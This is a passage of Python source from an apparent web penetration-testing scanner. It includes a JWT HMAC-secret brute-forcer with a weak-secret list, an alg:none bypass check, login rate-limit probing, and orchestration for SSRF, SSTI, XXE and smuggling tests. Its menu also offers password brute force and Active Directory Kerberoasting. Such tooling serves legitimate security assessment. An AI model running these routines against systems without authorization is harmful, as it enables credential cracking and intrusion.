    message = f"{parts[0]}.{parts[1]}".encode()
    sig = base64.urlsafe_b64decode(parts[2] + "==")
    alg_map = {"HS256": _hashlib.sha256, "HS384": _hashlib.sha384, "HS512": _hashlib.sha512}
    try:
        header = _b64_decode_jwt(parts[0])
        alg = header.get("alg", "HS256")
        hash_func = alg_map.get(alg)
        if not hash_func:
            return None
    except Exception:
        return None

    default_secrets = [
        "secret", "password", "123456", "changeme", "admin", "test",
        "supersecret", "jwt_secret", "app_secret", "mysecret", "",
        "your-256-bit-secret", "your-secret", "secretkey", "key",
    ]
    words = default_secrets[:]
    if wordlist and os.path.exists(wordlist):
        try:
            with open(wordlist, "r", errors="ignore") as f:
                words += [line.strip() for line in f if line.strip()][:2000]
        except Exception:
            pass

    for word in words:
        try:
            expected = _hmac.new(word.encode(), message, hash_func).digest()
            if expected == sig:
                return word
        except Exception:
            pass
    return None

def test_jwt_tokens(target, session):
    """JWT: detection, analysis, alg:none, RS256->HS256, kid path traversal, secret brute force."""
    try:
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        jwt_regex = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
        jwt_candidates = set()
        # Search in headers.
        for header_val in resp.headers.values():
            jwt_candidates.update(jwt_regex.findall(header_val))
        # Buscar en cookies.
        for cookie in resp.cookies:
            jwt_candidates.update(jwt_regex.findall(cookie.value))
        # Search in the active session (if there is a Bearer token).
        auth_header = _session_header_value(session, "Authorization")
        if auth_header:
            jwt_candidates.update(jwt_regex.findall(auth_header))
        # Persistent cookies from the session jar (token saved after login).
        for cookie in session.cookies:
            jwt_candidates.update(jwt_regex.findall(cookie.value or ""))
        # Response body: SPAs embed the token in the HTML/JS.
        jwt_candidates.update(jwt_regex.findall(resp.text or ""))
        # Responses from discovered API endpoints (headers and body).
        for ep in (SCAN_DATA.get("api_endpoints") or [])[:15]:
            eurl = ep.get("url") if isinstance(ep, dict) else None
            if not eurl:
                continue
            try:
                er = session.get(eurl, timeout=DEFAULT_TIMEOUT)
                for hv in er.headers.values():
                    jwt_candidates.update(jwt_regex.findall(hv))
                jwt_candidates.update(jwt_regex.findall(er.text or ""))
            except Exception:
                pass

        if not jwt_candidates:
            print_info("No JWTs detected in headers, cookies, body, or API endpoints.")
            return

        for jwt in jwt_candidates:
            try:
                parts = jwt.split(".")
                if len(parts) < 3:
                    continue
                header_data = _b64_decode_jwt(parts[0])
                payload_data = _b64_decode_jwt(parts[1])
                alg = header_data.get("alg", "").upper()
                kid = header_data.get("kid", "")
                print_info(f"JWT detected — alg: {alg}  kid: {kid or 'N/A'}")

                # alg:none activo.
                if alg in ("NONE", ""):
                    msg = "JWT with alg:none — signature completely ignored"
                    print_vuln(msg)
                    FINDINGS.append({"name": "JWT alg:none", "detail": msg, "severity": "critical"})

                # Intentar alg:none bypass.
                elif _jwt_test_alg_none(target, session, jwt):
                    msg = "JWT alg:none bypass confirmed — the server accepts unsigned tokens"
                    print_vuln(msg)
                    FINDINGS.append({"name": "JWT alg:none bypass", "detail": msg, "severity": "critical"})
                else:
                    print_info(f"  alg:none bypass: not accepted (correct).")

                # RS256 -> HS256 key confusion (warning).
                if alg in ("RS256", "RS384", "RS512"):
                    msg = f"JWT RSA ({alg}): review RS256->HS256 confusion with the server's public key"
                    print_warning(msg)
                    FINDINGS.append({"name": "JWT RS256->HS256 confusion", "detail": msg, "severity": "high"})

                # kid path traversal.
                if kid:
                    dangerous_kid = any(c in kid for c in ("..", "/", "\\", "file:"))
                    if dangerous_kid:
                        msg = f"JWT kid sospechoso de path traversal: '{kid}'"
                        print_vuln(msg)
                        FINDINGS.append({"name": "JWT kid path traversal", "detail": msg, "severity": "high"})
                    elif "sql" in kid.lower() or "'" in kid or '"' in kid:
                        msg = f"JWT kid with possible SQLi: '{kid}'"
                        print_warning(msg)
                        FINDINGS.append({"name": "JWT kid SQLi", "detail": msg, "severity": "high"})

                # Brute force secreto HMAC.
                if alg in ("HS256", "HS384", "HS512"):
                    print_info(f"  Intentando brute force de secreto HMAC ({alg})...")
                    found_secret = _jwt_brute_secret(jwt)
                    if found_secret is not None:
                        msg = f"Weak HMAC JWT secret found: '{found_secret}'"
                        print_vuln(msg)
                        FINDINGS.append({"name": "JWT weak secret", "detail": msg, "severity": "critical"})
                    else:
                        print_info("  Secret not found in reduced wordlist (check manually with hashcat).")

                # Fields de privilegio exposeds.
                sensitive_keys = {"admin", "role", "is_admin", "permission", "privilege", "scope", "group", "groups"}
                exposed = [k for k in payload_data if k.lower() in sensitive_keys]
                if exposed:
                    msg = f"JWT exposes privilege fields: {exposed} = {[payload_data[k] for k in exposed]}"
                    print_warning(msg)
                    FINDINGS.append({"name": "JWT sensitive fields", "detail": msg, "severity": "medium"})

                # Token caducado pero aceptado.
                exp = payload_data.get("exp")
                if exp and exp < time.time():
                    try:
                        r_expired = session.get(target, timeout=DEFAULT_TIMEOUT)
                        if r_expired.status_code not in (401, 403):
                            msg = "Expired JWT still accepted by the server"
                            print_vuln(msg)
                            FINDINGS.append({"name": "JWT expired accepted", "detail": msg, "severity": "medium"})
                    except Exception:
                        pass

            except Exception:
                pass
    except Exception as e:
        print_error(f"Error en test JWT: {e}")


# ========== RATE LIMITING MEJORADO ==========

def test_api_rate_limiting(target, session):
    """Rate limiting: 429, soft-block (delays), captcha, and IP ban."""
    candidates = [
        urljoin(target, "/api/v1/login"),
        urljoin(target, "/api/login"),
        urljoin(target, "/api/auth"),
        urljoin(target, "/login"),
    ]
    for test_url in candidates:
        statuses = []
        times = []
        body_samples = []
        try:
            for i in range(25):
                t0 = time.time()
                try:
                    resp = session.post(test_url, json={"username": "test", "password": "test"},
                                        timeout=DEFAULT_TIMEOUT)
                    elapsed = time.time() - t0
                    statuses.append(resp.status_code)
                    times.append(elapsed)
                    body_samples.append((resp.status_code, resp.text[:200]))
                    if resp.status_code in (429, 503):
                        break
                except requests.RequestException:
                    break
            if not statuses:
                continue

            if 429 in statuses:
                idx = statuses.index(429)
                msg = f"Rate limiting activo (HTTP 429) en {test_url} tras {idx+1} peticiones"
                print_good(msg)
                FINDINGS.append({"name": "Rate limiting OK", "detail": msg, "severity": "info"})
                return

            if 503 in statuses:
                print_good(f"Possible rate limiting via 503 on {test_url}")
                return

            # Soft-block: deteccion de retraso progresivo.
            if len(times) >= 10:
                first_avg = sum(times[:5]) / 5
                last_avg = sum(times[-5:]) / 5
                if last_avg > first_avg * 2.5:
                    msg = f"Possible soft-block on {test_url}: average latency went from {first_avg:.2f}s to {last_avg:.2f}s"
                    print_warning(msg)
                    FINDINGS.append({"name": "Rate limiting (soft-block latency)", "detail": msg, "severity": "low"})
                    return

            # Captcha.
            captcha_markers = ["captcha", "recaptcha", "hcaptcha", "turnstile", "challenge", "verify you"]
            for status, body in body_samples[-5:]:
                if any(m in body.lower() for m in captcha_markers):
                    msg = f"Captcha detected en {test_url} — proteccion anti-brute force activa"
                    print_good(msg)
                    FINDINGS.append({"name": "Rate limiting (captcha)", "detail": msg, "severity": "info"})
                    return

            # IP ban / blocking via 403.
            if statuses.count(403) >= 5:
                msg = f"Possible IP ban on {test_url}: {statuses.count(403)} consecutive 403 responses"
                print_good(msg)
                FINDINGS.append({"name": "Rate limiting (IP ban 403)", "detail": msg, "severity": "info"})
                return

            # No proteccion.
            msg = f"No rate limiting detected en {test_url}: {len(statuses)} peticiones without blocking"
            print_vuln(msg)
            FINDINGS.append({"name": "No rate limiting", "detail": msg, "severity": "medium"})
            return

        except Exception as e:
            print_error(f"Error en test rate limiting ({test_url}): {e}")


# ========== INTEGRATOR MODULE: ADVANCED TESTS ==========

def run_advanced_security_tests(target, session):
    """Orquesta SSRF, SSTI, XXE, CRLF, HTTP Smuggling, Cache Poisoning."""
    print_phase("ADVANCED SECURITY TESTS")
    adv = {}

    # Colaborador OOB opcional.
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} OOB collaborator URL for SSRF (for example: Burp Collaborator, interactsh). Empty to skip:")
    collab = input("> ").strip() or None

    print_info("[1/6] SSRF...")
    adv["ssrf"] = safe_execute(test_ssrf, target, session, collab) or []

    print_info("[2/6] SSTI in discovered parameters and forms...")
    ssti_hits = []
    ssti_seen = set()
    get_points, post_points, ssti_endpoints = _collect_injection_points(target)
    # Common parameter names for templates (light fuzz, 2 probes).
    SSTI_PARAM_NAMES = ["template", "tpl", "render", "preview", "name", "q",
                        "search", "message", "input", "content", "page", "view"]
    light_probes = SSTI_PROBES[:2]

    def _try_ssti(url, param, method, probes=None):
        key = (url, param, method)
        if key in ssti_seen:
            return
        ssti_seen.add(key)
        if test_ssti(url, param, session, method, probes=probes):
            ssti_hits.append({"url": url, "param": param})

    for url, param in get_points:
        _try_ssti(url, param, "GET")
    for url, param in post_points:
        _try_ssti(url, param, "POST")
    for ep in ssti_endpoints[:30]:
        for param in SSTI_PARAM_NAMES:
            _try_ssti(ep, param, "GET", probes=light_probes)
    adv["ssti"] = ssti_hits

    print_info("[3/6] XXE...")
    found_endpoints = (SCAN_DATA.get("api_endpoints") or []) + ssti_endpoints
    adv["xxe"] = safe_execute(test_xxe, target, session, found_endpoints) or []

    print_info("[4/6] CRLF Injection...")
    adv["crlf"] = safe_execute(test_crlf, target, session) or []

    print_info("[5/6] HTTP Request Smuggling...")
    adv["smuggling"] = safe_execute(test_request_smuggling, target, session) or []

    print_info("[6/6] Cache Poisoning...")
    adv["cache_poisoning"] = safe_execute(test_cache_poisoning, target, session) or []

    SCAN_DATA["advanced_security"] = adv

    # --- Results tables per module ---
    sev_color = {
        "critical": Fore.MAGENTA, "high": Fore.RED,
        "medium": Fore.YELLOW, "low": Fore.CYAN, "info": Fore.WHITE,
    }

    def _sev_cell(sev):
        s = (sev or "info").lower()
        return f"{sev_color.get(s, '')}{s.upper()}{Style.RESET_ALL}"

    if adv.get("ssrf"):
        rows = []
        for r in adv["ssrf"]:
            t = r.get("type", "ssrf")
            vector = r.get("param") or r.get("header") or "-"
            payload = (r.get("payload") or r.get("value") or "")[:60]
            rows.append([t, vector, payload, str(r.get("status", "-"))])
        print_table(["Type", "Vector", "Payload/Value", "HTTP"],
                    rows, title="SSRF — Findings",
                    border_color=Fore.RED)

    if adv.get("ssti"):
        rows = [[r.get("url", "-")[:60], r.get("param", "-"),
                 r.get("engine", "-")] for r in adv["ssti"]]
        print_table(["URL", "Parameter", "Engine"],
                    rows, title="SSTI — Findings",
                    border_color=Fore.RED)

    if adv.get("xxe"):
        rows = [[r.get("url", "-")[:60], r.get("content_type", "-"),
                 r.get("note", "confirmado")] for r in adv["xxe"]]
        print_table(["URL", "Content-Type", "Status"],
                    rows, title="XXE — Findings",
                    border_color=Fore.RED)

    if adv.get("crlf"):
        rows = [[r.get("vector", "-"), r.get("param") or r.get("url", "-")[:50],
                 r.get("payload", "-")[:40]] for r in adv["crlf"]]
        print_table(["Vector", "URL/Param", "Payload"],
                    rows, title="CRLF Injection — Findings",
                    border_color=Fore.YELLOW)

    if adv.get("smuggling"):
        rows = [[r.get("tool") or r.get("type", "-"),
                 r.get("note") or r.get("output_snippet", "-")[:60]] for r in adv["smuggling"]]
        print_table(["Tool/Type", "Detail"],
                    rows, title="HTTP Request Smuggling — Findings",
                    border_color=Fore.RED)

    if adv.get("cache_poisoning"):
        rows = [[r.get("header", "-"), r.get("value", "-")[:40],
                 "CONFIRMADO" if r.get("confirmed") else "REFLECTED"] for r in adv["cache_poisoning"]]
        print_table(["Header", "Injected value", "Status"],
                    rows, title="Cache Poisoning — Findings",
                    border_color=Fore.YELLOW)

    # Global summary table.
    module_names = ["ssrf", "ssti", "xxe", "crlf", "smuggling", "cache_poisoning"]
    summary_rows = [[name.upper(), str(len(adv.get(name) or []))] for name in module_names]
    total = sum(len(adv.get(n) or []) for n in module_names)
    print_table(["Module", "Findings"], summary_rows,
                title="Advanced Tests — Summary",
                footer=f"  Total findings: {total}",
                border_color=Fore.CYAN)
    print_good(f"Advanced tests completed. {total} findings recorded.")


# ========== MAIN MENU ==========
def _has_scan_data():
    """True if at least one module ran and there is data to report."""
    return any([
        bool(FINDINGS),
        bool(SCAN_DATA.get("general")),
        bool(SCAN_DATA.get("injection")),
        bool(SCAN_DATA.get("api_endpoints")),
        bool(SCAN_DATA.get("vhosts")),
        bool(SCAN_DATA.get("directory_hits")),
        bool(SCAN_DATA.get("users")),
        bool(SCAN_DATA.get("emails")),
        bool(SCAN_DATA.get("bruteforce_credentials")),
        bool(SCAN_DATA.get("wordpress")),
        bool(SCAN_DATA.get("active_directory")),
        bool(SCAN_DATA.get("spider")),
        bool(SCAN_DATA.get("nuclei_findings")),
        bool((SCAN_DATA.get("source_code_analysis") or {}).get("findings")),
        bool((SCAN_DATA.get("nmap") or {}).get("ports")),
        bool(SCAN_DATA.get("advanced_security")),
    ])

def show_menu(targets=None):
    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(BANNER)
        print(DESCRIPTION)
        print(DEVELOPER + "\n")
    auth_status = (f"{Fore.GREEN}[Authenticated]{Style.RESET_ALL}" if AUTHENTICATED
                   else f"{Fore.YELLOW}[Unauthenticated]{Style.RESET_ALL}")
    print("=" * 52)
    print(f"  OWASP SCANNER v{VERSION}  {auth_status}")
    print("=" * 52)
    if targets and len(targets) > 1:
        print(f"{Fore.CYAN}  Multi-target mode: each option runs against all "
              f"{len(targets)} targets{Style.RESET_ALL}")
        for i, t in enumerate(targets, 1):
            print(f"    {i}. {t}")
        print("=" * 52)
    print(" 1. Configure authentication (login / headless SPA / OAuth2)")
    print(" 2. General information and enumeration")
    print(" 3. Port scanning with Nmap (-sV + targeted NSE)")
    print(" 4. Vulnerability analysis with Nuclei")
    print(" 5. Subdomain fuzzing (vhost) with ffuf")
    print(" 6. Directory fuzzing (uses ffuf when installed)")
    print(" 7. Spidering / complete site mapping")
    print(" 8. Source-code analysis (credentials/secrets in HTML and JS)")
    print(" 9. Injection tests (SQLi, XSS, Path Traversal, Command Injection)")
    print("10. Advanced tests (SSRF / SSTI / XXE / CRLF / Smuggling / Cache)")
    print("11. API tests (discovery, IDOR, mass assignment, JWT, rate limit)")
    print("12. User/email enumeration and password brute force")
    print("13. WordPress enumeration and attacks (WPScan)")
    print("14. Active Directory pentesting (Kerbrute/LDAP/NXC)")
    print("15. FULL PENTEST (runs all previous tests)")
    if _has_scan_data():
        print("16. Show Markdown summary")
        print("17. Show result tables (visual format)")
    print("18. Exit")
    print("="*50)

def run_information_gathering(target, session):
    print_phase("GATHERING GENERAL INFORMATION")
    info = safe_execute(gather_info, target, session)
    if info:
        SCAN_DATA["general"] = {
            "status_code": info.get("status_code"),
            "server": info.get("server"),
            "technologies": info.get("technologies", []),
            "technologies_source": info.get("technologies_source", "unknown"),
            "headers": info.get("headers", {}),
            "cookies": [c.name for c in info.get("cookies", [])],
        }
        print_info(f"Server: {info['server']}")
        robots_paths = safe_execute(check_robots_sitemap, target, session) or []
        http_methods = safe_execute(check_http_methods, target, session) or []
        SCAN_DATA["robots_paths"] = robots_paths
        SCAN_DATA["http_methods"] = list(set(http_methods))
        safe_execute(check_security_headers, info['headers'])
        safe_execute(check_cookie_security, info['cookies'])
        resp = safe_execute(session.get, target, timeout=DEFAULT_TIMEOUT)
        if resp:
            safe_execute(check_info_disclosure, resp.text)
        safe_execute(check_directory_listing, target, session)
        safe_execute(check_ssl_tls, target)
        safe_execute(test_cors_advanced, target, session)

def run_vhost_fuzzing(target, session):
    print_phase("FUZZING DE SUBDOMINIOS (VHOST)")
    parsed = urlparse(target)
    host = parsed.hostname or ""
    # If the target is an IP, manual base domain is required; if it is an FQDN, suggest it
    is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host))
    if is_ip:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Base domain (for example: planning.htb) - required when target is an IP:")
        base_domain = input("> ").strip()
    else:
        default = host
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Base domain [{default}]:")
        base_in = input("> ").strip()
        base_domain = base_in or default
    if not base_domain:
        print_error("Base domain required. Skipping vhost fuzzing.")
        return
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use default wordlist (SecLists DNS/namelist.txt)? [Y/n]:")
    use_default = input("> ").strip().lower()
    wordlist = None
    if use_default == 'n':
        custom_wl = input_path("Path a wordlist personalizada: ").strip()
        if custom_wl:
            wordlist = custom_wl
    if check_ffuf():
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use ffuf? (recommended) [Y/n]:")
        use_ffuf = input("> ").strip().lower() != 'n'
    else:
        use_ffuf = False
        print_warning("ffuf is not installed. Using internal method.")
    # For vhost fuzzing, the bottleneck is the server's RTT (not CPU
    # local), so a high default is useful. The user can lower it if
    # el target tiene WAF/rate-limiting.
    default_threads = max(THREADS, 50)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Threads [{default_threads}]:")
    t_in = input("> ").strip()
    try:
        vhost_threads = int(t_in) if t_in else default_threads
        if vhost_threads < 1:
            vhost_threads = default_threads
    except ValueError:
        vhost_threads = default_threads
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Request timeout in seconds [5]:")
    timeout_in = input("> ").strip()
    try:
        req_timeout = int(timeout_in) if timeout_in else 5
        if req_timeout < 1:
            req_timeout = 5
    except ValueError:
        req_timeout = 5
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Add detected file-size filter (-fs in ffuf)? [Y/n]:")
    use_fs = input("> ").strip().lower()
    use_fs_bool = (use_fs != 'n')

    hits = vhost_bruteforce(target, session, base_domain,
                            wordlist=wordlist, threads=vhost_threads,
                            request_timeout=req_timeout,
                            use_ffuf=use_ffuf, use_fs_filter=use_fs_bool) or []
    SCAN_DATA["vhosts"] = hits

def run_directory_fuzzing(target, session):
    print_phase("DIRECTORY FUZZING")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use default wordlist (raft-small-directories)? [Y/n]:")
    use_default = input("> ").strip().lower()
    wordlist = None
    if use_default == 'n':
        custom_wl = input_path("Path a wordlist personalizada: ").strip()
        if custom_wl:
            wordlist = custom_wl
        else:
            print_warning("No wordlist provided. Using internal list.")
    if check_ffuf():
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use ffuf for fuzzing? (recommended) [Y/n]:")
        use_ffuf = input("> ").strip().lower() != 'n'
    else:
        use_ffuf = False
        print_warning("ffuf is not installed. Using internal method.")
    hits = dir_bruteforce(target, session, wordlist=wordlist, threads=THREADS, use_ffuf=use_ffuf) or []
    SCAN_DATA["directory_hits"] = hits

def run_injection_tests(target, session):
    print_phase("ADVANCED INJECTION TESTS")
    try:
        forms, url_params = safe_execute(extract_forms_and_params, target, session)
        SCAN_DATA["injection"] = {
            "executed": True,
            "forms_found": len(forms or []),
            "url_params_found": len(url_params or []),
            "tested_get_params": [],
            "tested_form_inputs": [],
            "forms": list(forms or []),
        }
        if not forms and not url_params:
            print_warning("No parameters or forms found to test.")
            return
        if url_params:
            print_info(f"Testing {len(url_params)} GET parameters...")
            for param in url_params:
                if advanced_injection_tests(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                if test_path_traversal(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                if test_open_redirect(target, param, session, 'GET'):
                    SCAN_DATA["injection"]["tested_get_params"].append(param)
                    continue
                SCAN_DATA["injection"]["tested_get_params"].append(param)
        if forms:
            print_info(f"Testing {len(forms)} forms...")
            for form in forms:
                action = form['action']
                method = form['method']
                inputs = form['inputs']
                form_url = action if action else form.get('page_url', target)
                for inp in inputs:
                    SCAN_DATA["injection"]["tested_form_inputs"].append({
                        "url": form_url,
                        "method": method,
                        "input": inp,
                    })
                    if method == 'POST':
                        if advanced_injection_tests(form_url, inp, session, 'POST'):
                            continue
                        if test_path_traversal(form_url, inp, session, 'POST'):
                            continue
                        if test_open_redirect(form_url, inp, session, 'POST'):
                            continue
                    else:
                        if advanced_injection_tests(form_url, inp, session, 'GET'):
                            continue
                        if test_path_traversal(form_url, inp, session, 'GET'):
                            continue
                        if test_open_redirect(form_url, inp, session, 'GET'):
                            continue
    except KeyboardInterrupt:
        print_warning("Injection tests interrupted by the user.")
        return

def run_api_tests(target, session):
    print_phase("API TESTS (OWASP API Top 10)")
    print_info("[1/7] Descubrimiento de endpoints...")
    found = safe_execute(discover_api_endpoints, target, session) or []
    SCAN_DATA["api_endpoints"] = found
    print_info("[2/7] CORS avanzado...")
    safe_execute(test_cors_advanced, target, session)
    print_info("[3/7] GraphQL introspection...")
    safe_execute(test_graphql, target, session)
    print_info("[4/7] JWT & authentication...")
    safe_execute(test_jwt_tokens, target, session)
    if found:
        print_info("[5/7] IDOR / BOLA...")
        safe_execute(test_api_idor, found, session)
        print_info("[6/7] Mass Assignment...")
        safe_execute(test_api_mass_assignment, found, session)
        print_info("[7/7] Verbose errors + Auth bypass...")
        safe_execute(test_api_verbose_errors, found, session)
        safe_execute(test_api_auth_bypass, found, session)
    else:
        print_info("[5-7/7] Skipping endpoint tests (none found).")
    safe_execute(test_api_rate_limiting, target, session)
    print_good("API tests completed.")

def run_user_enum_bruteforce(target, session):
    print_phase("USER ENUMERATION AND BRUTE FORCE")
    users, emails = safe_execute(enumerate_users_from_endpoints, target, session) or ([], [])
    users = sorted(set(users or []))
    SCAN_DATA["users"] = users
    SCAN_DATA["emails"] = sorted(set(emails or []))
    if users:
        print_good(f"Users found: {', '.join(users)}")
    if emails:
        print_good(f"Emails found: {', '.join(emails)}")
    safe_execute(test_user_enumeration_form, target, session)
    wp_users = safe_execute(run_wpscan_user_enumeration_if_wordpress, target, session, users)
    if wp_users is not None:
        users = sorted(set(wp_users or []))
        SCAN_DATA["users"] = users
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run password brute force? (y/n):")
    want_brute = input("> ").strip().lower()
    if want_brute in ('', 'y', 's'):
        passlist = input_path("Password wordlist path (leave empty to use SecLists default): ").strip()
        if not users:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter users separated by commas:")
            users_input = input("> ").strip()
            if users_input:
                users = [u.strip() for u in users_input.split(',') if u.strip()]
            else:
                users = ['admin', 'test']
        brute_data = safe_execute(bruteforce_login, target, session, users, passlist if passlist else None)
        if brute_data:
            SCAN_DATA["bruteforce_credentials"] = brute_data.get("credentials", [])

def run_spider(target, session):
    print_phase("SPIDERING / FULL SITE MAPPING")
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Maximum number of pages to crawl (default 500):")
    max_pages = input("> ").strip()
    if not max_pages:
        max_pages = 500
    else:
        max_pages = int(max_pages)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Maximum crawl depth (default 3):")
    max_depth = input("> ").strip()
    if not max_depth:
        max_depth = 3
    else:
        max_depth = int(max_depth)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Respect robots.txt? [Y/n]:")
    use_robots = input("> ").strip().lower() != 'n'
    urls, params, forms = spider_website(target, session, max_pages=max_pages, max_depth=max_depth, use_robots=use_robots)
    SCAN_DATA["spider"] = {
        "total_urls": len(urls),
        "total_params": len(params),
        "total_forms": len(forms),
        "sample_urls": sorted(list(urls)),
        "sample_params": sorted(list(params)),
        "sample_forms": list(forms),
    }
    print_good(f"Total URLs discovered: {len(urls)}")
    if params:
        print_info(f"Unique parameters found: {len(params)}")
    save = input("Save URL list to a file? (y/n): ").strip().lower()
    if save in ('y', 's'):
        filename = input("File name (default: spider_output.txt): ").strip()
        if not filename:
            filename = "spider_output.txt"
        with open(filename, 'w') as f:
            for url in sorted(urls):
                f.write(url + '\n')
        print_good(f"URLs guardadas en {filename}")
    return urls

def run_source_code_analysis(target, session, urls=None):
    """Analyze accessible page source code for credentials and exposed scripts.

    If `urls` is not provided, try to reuse sampled URLs from SCAN_DATA["spider"];
    if none exist, offer to run a quick spider or analyze only the target.
    """
    print_phase("SOURCE CODE ANALYSIS")
    if urls is None:
        sample = (SCAN_DATA.get("spider") or {}).get("sample_urls") or []
        if sample:
            urls = list(sample)
            print_info(f"Using {len(urls)} URLs from the last spider.")
        else:
            try:
                ans = input(
                    f"{Fore.YELLOW}[?]{Style.RESET_ALL} No previous spider data. "
                    f"Run a quick spider (max 50 pages)? [Y/n]: "
                ).strip().lower()
            except (KeyboardInterrupt, EOFError):
                ans = 'n'
            if ans != 'n':
                discovered, _params, _forms = spider_website(
                    target, session, max_pages=50, max_depth=2, use_robots=True
                )
                SCAN_DATA["spider"] = {
                    "total_urls": len(discovered),
                    "total_params": 0,
                    "total_forms": 0,
                    "sample_urls": sorted(list(discovered)),
                    "sample_params": [],
                    "sample_forms": [],
                }
                urls = list(discovered)
            else:
                print_warning("Analyzing only the target URL.")
                urls = [target]
    result = analyze_source_code(target, session, urls=urls)
    SCAN_DATA["source_code_analysis"] = result
    return result

def print_final_summary(target):
    """Print a final collection with all SCAN_DATA and FINDINGS tables.

    Called at the end of a full pentest (option 9) to provide a
    consolidated view of all information collected before saving the report.
    """
    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    SEV_COLOR = {
        'critical': Fore.MAGENTA, 'high': Fore.RED, 'medium': Fore.YELLOW,
        'low': Fore.CYAN, 'info': Fore.WHITE, 'unknown': Fore.WHITE,
    }

    def _trim(value, width=80):
        text = str(value) if value is not None else "-"
        return text if len(text) <= width else text[: width - 3] + "..."

    def _stringify(item):
        """Converts an item (str/dict/other) to a readable string."""
        if isinstance(item, str):
            return item
        if isinstance(item, dict):
            name = item.get("name") or item.get("template_id") or item.get("url") or ""
            detail = item.get("detail") or item.get("value") or ""
            if name and detail:
                return f"{name} ({detail})"
            return name or detail or str(item)
        return str(item)

    def _join_safe(items, sep=", "):
        return sep.join(_stringify(i) for i in (items or []))

    def _count_label(total, limit):
        if total <= limit:
            return f"({total})"
        return f"(top {limit} de {total})"

    print_phase("FINAL PENTEST SUMMARY")

    general = SCAN_DATA.get("general") or {}
    nuclei_summary = SCAN_DATA.get("nuclei_summary") or {}
    nuclei_findings = SCAN_DATA.get("nuclei_findings") or []
    spider = SCAN_DATA.get("spider") or {}
    injection = SCAN_DATA.get("injection") or {}
    vhosts = SCAN_DATA.get("vhosts") or []
    dir_hits = SCAN_DATA.get("directory_hits") or []
    api_endpoints = SCAN_DATA.get("api_endpoints") or []
    users = SCAN_DATA.get("users") or []
    emails = SCAN_DATA.get("emails") or []
    creds = SCAN_DATA.get("bruteforce_credentials") or []
    wordpress = SCAN_DATA.get("wordpress") or {}
    robots_paths = SCAN_DATA.get("robots_paths") or []
    http_methods = SCAN_DATA.get("http_methods") or []
    src_code = SCAN_DATA.get("source_code_analysis") or {}
    src_findings = src_code.get("findings") or []
    nmap_data = SCAN_DATA.get("nmap") or {}
    nmap_ports = nmap_data.get("ports") or []
    nmap_nse = nmap_data.get("nse_results") or []
    active_directory = SCAN_DATA.get("active_directory") or {}
    ad_ldap = active_directory.get("ldap") or {}
    ad_imp = active_directory.get("impacket") or {}
    ad_nxc = active_directory.get("nxc") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes") or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes") or []
    ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials") or []

    # 1. Executive summary
    overview_rows = [
        ["Target", _trim(target, 90)],
        ["Status HTTP", str(general.get("status_code", "-"))],
        ["Server", _trim(general.get("server", "-"), 90)],
        ["Technologies", _trim(_join_safe(general.get("technologies", [])) or "-", 90)],
        ["Findings (FINDINGS)", str(len(FINDINGS))],
        ["Open ports (nmap)", str(len(nmap_ports))],
        ["Targeted NSE Results", str(len(nmap_nse))],
        ["Vulnerabilities Nuclei", str(len(nuclei_findings))],
        ["URLs spider", str(spider.get("total_urls", 0))],
        ["Subdominios (vhosts)", str(len(vhosts))],
        ["Directories found", str(len(dir_hits))],
        ["Endpoints API", str(len(api_endpoints))],
        ["Users", str(len(users))],
        ["Emails", str(len(emails))],
        ["Valid credentials", str(len(creds))],
        ["WordPress vulnerabilities", str(len(wordpress.get("vulnerabilities") or []))],
        ["Users AD (LDAP)", str(len(ad_ldap.get("users") or []))],
        ["AS-REP roastable", str(len(asrep_hashes))],
        ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
        ["Credentials AD (NXC)", str(len(ad_creds))],
        ["Source-code findings", str(len(src_findings))],
        ["SSRF findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("ssrf") or []))],
        ["SSTI findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("ssti") or []))],
        ["XXE findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("xxe") or []))],
        ["CRLF findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("crlf") or []))],
        ["HTTP Smuggling findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("smuggling") or []))],
        ["Cache Poisoning findings", str(len((SCAN_DATA.get("advanced_security") or {}).get("cache_poisoning") or []))],
    ]
    print_table(
        headers=["Field", "Value"],
        rows=overview_rows,
        alignments=['<', '<'],
        title="Executive summary:",
    )

    # 2. Headers de seguridad
    sec_header_names = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options",
        "Referrer-Policy", "Permissions-Policy",
    ]
    headers = (general.get("headers") or {})
    sec_rows = []
    for h in sec_header_names:
        v = headers.get(h) or headers.get(h.lower()) or "-"
        present = v != "-"
